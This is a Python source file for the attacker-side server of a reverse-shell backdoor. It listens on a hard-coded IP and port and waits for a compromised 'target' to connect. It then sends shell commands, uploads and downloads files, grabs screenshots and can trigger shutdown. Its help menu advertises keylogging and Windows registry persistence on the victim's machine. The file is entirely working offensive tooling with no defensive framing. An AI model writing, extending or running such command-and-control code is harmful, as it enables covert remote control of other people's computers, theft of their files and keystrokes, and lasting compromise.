import socket
import termcolor
import json
import os

IP = '172.26.40.74'
PORT = 9999

def reliable_send(data):
    jsondata=json.dumps(data)
    target.send(jsondata.encode())
    
def reliable_recv():
    data=''
    while True:
        try:
            data=data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def upload_file(file_name):
    f=open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f= open(file_name, 'wb')
    target.settimeout(1)
    chunk=target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    count=0
    while True:
        command=input('[*]shell-%s: ' %str(ip))
        #target.send()
        reliable_send(command)
        if command=="quit":
            break
        elif command=="clear":
            os.system('cls')
        elif command[:3]=="cd ":
            pass
        elif command[:6]=="upload":
            upload_file(command[7:])
        elif command[:8]=="download":
            download_file(command[9:])
        elif command[:10]=="screenshot":
            f= open("screenshot%d" %(count), 'wb')
            target.settimeout(3)
            chunk=target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk=target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        elif command[:8]=="shutdown":
            break
        elif command=="help":
            print(termcolor.colored('''\n
            quit                                --> Quit the session
            clear                               --> Clear the sceen
            cd *Directary Name*                  --> Changes Directory on target Mechane
            upload *Filename                     --> Uplode file to Target mechane
            downlode *Filename*                 --> downlode file from target mechane
            keylog_start                        --> start keylogger
            keylog_dump                         --> Print the key strokes that the target enter
            keylog_stop                         --> stop keylogger
            persistance *RegName* *filename*    --> Create persistance in Registry
            shutdown *TIME*                     --> target machine will shut down after Time in second'''))
        else:
            result= reliable_recv()
            print(result)

sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((IP, PORT))
print(termcolor.colored('[+] Listening For The Connection', 'white'))
sock.listen(5)
target, ip= sock.accept()
print(termcolor.colored("{+} Target Connected From: " + str(ip), 'yellow'))
target_communication()